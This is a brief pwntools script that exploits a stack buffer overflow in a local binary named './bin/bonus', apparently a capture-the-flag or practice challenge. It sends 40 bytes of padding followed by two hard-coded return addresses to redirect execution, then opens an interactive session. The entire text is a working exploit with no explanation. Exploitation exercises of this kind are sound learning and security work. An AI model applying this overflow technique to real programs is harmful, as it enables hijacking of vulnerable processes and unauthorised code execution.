from pwn import *

target = process("./bin/bonus")

payload = b"a" * (32 + 8) + p64(0x401136) + p64(0x40114F)

target.send(payload)

target.interactive()
